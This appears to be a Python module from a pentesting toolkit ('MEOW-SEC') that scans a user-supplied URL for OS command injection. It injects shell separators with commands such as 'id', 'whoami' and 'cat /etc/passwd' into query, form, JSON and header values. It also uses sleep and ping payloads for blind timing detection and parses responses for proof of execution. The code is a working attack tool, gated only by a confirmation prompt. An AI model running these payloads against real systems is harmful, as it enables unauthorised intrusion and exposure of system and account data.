# -*- coding: utf-8 -*-
"""MEOW-SEC :: CMDI — OS Command Injection Tester"""
import os, re, json, time
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.ui import (console, show_module_banner, ok, err, info, warn, find,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_SCAN, CAT_FOUND
from rich.panel  import Panel
from rich.table  import Table
from rich.prompt import Prompt, Confirm
from rich.rule   import Rule
from rich        import box

try:
    import requests as _req
    _req.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except Exception:
    HAS_REQUESTS = False

from core.proxy_manager import px as _px

_UA      = "MEOW-CMDI/1.0 (authorized-test)"
_TIMEOUT = 14

# ─── SÉPARATEURS DE COMMANDES ────────────────────────────────

_SEPARATORS = [
    ";", "|", "&&", "||", "`",
    "\n", "%0a", "%0d%0a",
    "&", "$(", "\";", "';",
]

# ─── COMMANDES ET MARQUEURS ──────────────────────────────────

_CMDS_UNIX = [
    ("id",              ["uid=", "gid=", "groups="]),
    ("whoami",          ["root", "www-data", "nobody", "apache", "nginx"]),
    ("uname -a",        ["linux", "ubuntu", "debian", "centos", "alpine"]),
    ("cat /etc/passwd", ["root:", "daemon:", "bin:", "usr/sbin"]),
    ("hostname",        []),
]

_CMDS_WIN = [
    ("whoami",          ["nt authority", "system", "administrator", "desktop-"]),
    ("ver",             ["microsoft windows", "windows version"]),
    ("ipconfig",        ["ipv4 address", "ethernet adapter", "ip address"]),
    ("dir",             ["directory of", "volume in drive", "<dir>"]),
]

_UNIX_MARKERS = ["uid=", "gid=", "root:", "daemon:", "/bin/sh", "/bin/bash",
                 "www-data", "nobody", "linux", "ubuntu", "debian", "centos",
                 "alpine", "hostname", "kernel"]
_WIN_MARKERS  = ["nt authority", "system32", "windows", "administrator",
                 "volume in drive", "directory of", "for 16-bit app support",
                 "ip address", "ipv4 address", "windows version"]

# ─── PAYLOADS TIME-BASED ─────────────────────────────────────

_TIME_UNIX = [
    ("; sleep 4",           4.0, "Linux"),
    ("| sleep 4",           4.0, "Linux"),
    ("&& sleep 4",          4.0, "Linux"),
    ("|| sleep 4",          4.0, "Linux"),
    ("`sleep 4`",           4.0, "Linux"),
    ("$(sleep 4)",          4.0, "Linux"),
    ("\nsleep 4\n",         4.0, "Linux"),
    ("; ping -c 4 127.0.0.1", 4.0, "Linux"),
]

_TIME_WIN = [
    ("& ping -n 5 127.0.0.1", 3.5, "Windows"),
    ("| ping -n 5 127.0.0.1", 3.5, "Windows"),
    ("; ping -n 5 127.0.0.1", 3.5, "Windows"),
    ("& timeout /T 4",        4.0, "Windows"),
]

# ─── HELPERS HTTP ────────────────────────────────────────────

def _get(url, timeout=_TIMEOUT):
    try:
        return _req.get(url, verify=False, timeout=timeout, allow_redirects=True,
                        proxies=_px(), headers={"User-Agent": _UA})
    except Exception:
        return None


def _post(url, data, timeout=_TIMEOUT):
    try:
        return _req.post(url, data=data, verify=False, timeout=timeout,
                         allow_redirects=True, proxies=_px(),
                         headers={"User-Agent": _UA})
    except Exception:
        return None


def _post_json(url, data, timeout=_TIMEOUT):
    try:
        return _req.post(url, json=data, verify=False, timeout=timeout,
                         allow_redirects=True, proxies=_px(),
                         headers={"User-Agent": _UA,
                                  "Content-Type": "application/json"})
    except Exception:
        return None


def _inject(url, param, payload):
    p  = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [payload]
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))


def _check_markers(text):
    text_low = text.lower()
    for m in _UNIX_MARKERS:
        if m in text_low:
            return "Linux", m
    for m in _WIN_MARKERS:
        if m in text_low:
            return "Windows", m
    return None, None


# ─── DÉTECTION VERBOSE ───────────────────────────────────────

def _test_verbose(url, param, method="GET", post_data=None):
    """Injection visible — cherche la sortie de commande dans la réponse."""
    for sep in _SEPARATORS[:7]:
        for cmd, _ in (_CMDS_UNIX[:3] + _CMDS_WIN[:2]):
            payload = f"1{sep}{cmd}"
            if sep == "$(":
                payload = f"1$(  {cmd}  )"
            if method == "GET":
                r = _get(_inject(url, param, payload))
            elif method == "JSON":
                d = dict(post_data or {}); d[param] = payload
                r = _post_json(url, d)
            else:
                d = dict(post_data or {}); d[param] = payload
                r = _post(url, d)
            if not r:
                continue
            os_type, marker = _check_markers(r.text)
            if os_type:
                find(f"CMDI [{RD}]{os_type}[/] on [{CY}]{param}[/] — sep [{OR}]{sep!r}[/] → [{G1}]{cmd}[/]")
                return [{
                    "param": param, "type": "verbose-cmdi", "os": os_type,
                    "payload": payload, "evidence": marker, "severity": "CRITICAL"
                }]
    return []


# ─── DÉTECTION TIME-BASED ────────────────────────────────────

def _test_time(url, param, method="GET", post_data=None):
    """Injection aveugle via délai de réponse."""
    all_time_payloads = _TIME_UNIX + _TIME_WIN
    for suffix, delay, platform in all_time_payloads:
        payload = f"1{suffix}"
        try:
            t0 = time.time()
            if method == "GET":
                r = _get(_inject(url, param, payload), timeout=int(delay) + 7)
            elif method == "JSON":
                d = dict(post_data or {}); d[param] = payload
                r = _post_json(url, d, timeout=int(delay) + 7)
            else:
                d = dict(post_data or {}); d[param] = payload
                r = _post(url, d, timeout=int(delay) + 7)
            elapsed = time.time() - t0
            if elapsed >= delay - 0.6:
                find(f"Blind CMDI [{RD}]{platform}[/] on [{CY}]{param}[/] — {elapsed:.1f}s delay")
                return [{
                    "param": param, "type": "time-blind-cmdi", "os": platform,
                    "payload": payload, "evidence": f"{elapsed:.1f}s delay",
                    "severity": "CRITICAL"
                }]
        except Exception:
            pass
    return []


# ─── HEADER INJECTION ────────────────────────────────────────

_INJECTABLE_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For",
                       "X-Real-IP", "X-Custom-IP-Authorization"]

def _test_header_injection(url):
    """Injecte dans les headers HTTP courants."""
    findings = []
    for hdr in _INJECTABLE_HEADERS:
        for cmd, _ in _CMDS_UNIX[:2]:
            for sep in (";", "|", "`"):
                payload = f"legitimate{sep}{cmd}"
                try:
                    r = _req.get(url, verify=False, timeout=_TIMEOUT, allow_redirects=True,
                                 proxies=_px(), headers={"User-Agent": _UA, hdr: payload})
                    os_type, marker = _check_markers(r.text)
                    if os_type:
                        find(f"Header CMDI [{RD}]{os_type}[/] via header [{CY}]{hdr}[/]")
                        findings.append({
                            "param": hdr, "type": "header-cmdi", "os": os_type,
                            "payload": payload, "evidence": marker, "severity": "CRITICAL"
                        })
                        return findings
                except Exception:
                    pass
    return findings


# ─── SAVE ────────────────────────────────────────────────────

def _save(target, results):
    os.makedirs("data", exist_ok=True)
    slug = re.sub(r"[^a-zA-Z0-9_-]", "_", target)[:40]
    fname = f"data/cmdi_{slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({"target": target, "results": results,
                   "timestamp": datetime.now().isoformat()}, f, indent=2)
    ok(f"Results saved → [{CY}]{fname}[/]")


# ─── MAIN ────────────────────────────────────────────────────

def run():
    show_module_banner("cmdi")
    cat_talk(CAT_SCAN, "OS Command Injection — verbose output + blind time-based + headers", RD)
    console.print()
    warn("AUTHORIZED USE ONLY — Unauthorized testing is illegal.")
    if not Confirm.ask(f"  [{OR}]◈ I confirm this is an authorized target[/]", default=False):
        info("Aborted."); return

    if not HAS_REQUESTS:
        err("requests library not available. Run: pip install requests"); return

    url = Prompt.ask(f"  [{G1}]◈ Target URL[/]").strip()
    if not url.startswith("http"):
        url = "https://" + url

    console.print(f"\n  [{G1}][1][/] GET parameters")
    console.print(f"  [{G1}][2][/] POST form body")
    console.print(f"  [{G1}][3][/] POST JSON body")
    console.print(f"  [{G1}][4][/] HTTP Headers")
    method_choice = ask_choice("Method", "1")

    method    = {"1": "GET", "2": "POST", "3": "JSON", "4": "HEADER"}.get(method_choice, "GET")
    post_data = {}

    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())

    if method in ("POST", "JSON") or (not params and method == "GET"):
        param_str = Prompt.ask(f"  [{CY}]◈ Parameter name(s) (comma-sep)[/]", default="cmd").strip()
        params    = [p.strip() for p in param_str.split(",")]
        if method in ("POST", "JSON"):
            for p in params:
                post_data[p] = Prompt.ask(f"  [{CY}]◈ Default value for '{p}'[/]", default="ls").strip()

    console.print(f"\n  [{G1}][1][/] Verbose (output dans la réponse)")
    console.print(f"  [{G1}][2][/] Blind time-based")
    console.print(f"  [{G1}][3][/] Les deux  [{DM}](recommandé)[/]")
    mode = ask_choice("Mode", "3")

    info(f"Target [{CY}]{url}[/]  params {params}  method {method}")
    console.print()

    all_findings = []

    if method == "HEADER":
        console.print(Rule(f"[{G1}] CMDI :: HEADERS ", style=G2))
        info("Testing HTTP header injection...")
        findings = _test_header_injection(url)
        all_findings.extend(findings)
        if not findings:
            info(f"  [{DM}]No header command injection[/]")
    else:
        for param in params:
            console.print(Rule(f"[{G1}] CMDI :: {param} ", style=G2))

            if mode in ("1", "3"):
                info(f"  Verbose injection on [{CY}]{param}[/]...")
                findings = _test_verbose(url, param, method, post_data)
                all_findings.extend(findings)
                if not findings:
                    info(f"  [{DM}]No verbose command injection[/]")

            if mode in ("2", "3"):
                info(f"  Time-based blind on [{CY}]{param}[/] (plus lent)...")
                findings = _test_time(url, param, method, post_data)
                all_findings.extend(findings)
                if not findings:
                    info(f"  [{DM}]No time-based command injection[/]")

    console.print()

    if all_findings:
        cat_talk(CAT_FOUND, f"{len(all_findings)} command injection finding(s)!", G1)
        console.print(Panel(
            "\n".join([
                f"[{RD}]CRITICAL[/]  [{CY}]{f['param']}[/]  [{OR}]{f['type']}[/]"
                f"  OS:[{G1}]{f['os']}[/]  evidence:[{DM}]{f['evidence']}[/]"
                for f in all_findings
            ]),
            title=f"[{RD}]⚡ COMMAND INJECTION CONFIRMED",
            border_style=RD
        ))
        t = Table(title=f"[{G1}]CMDI Results[/]", box=box.MINIMAL_DOUBLE_HEAD,
                  border_style=G2, header_style=CY)
        t.add_column("Param",    min_width=14)
        t.add_column("Type",     min_width=18)
        t.add_column("OS",       min_width=10)
        t.add_column("Payload",  min_width=26)
        t.add_column("Evidence", min_width=16)
        for f in all_findings:
            t.add_row(f["param"], f"[{RD}]{f['type']}[/]",
                      f["os"], f["payload"][:42], f["evidence"][:24])
        console.print(t)
    else:
        ok("No command injection vulnerabilities detected.")

    _save(url, all_findings)
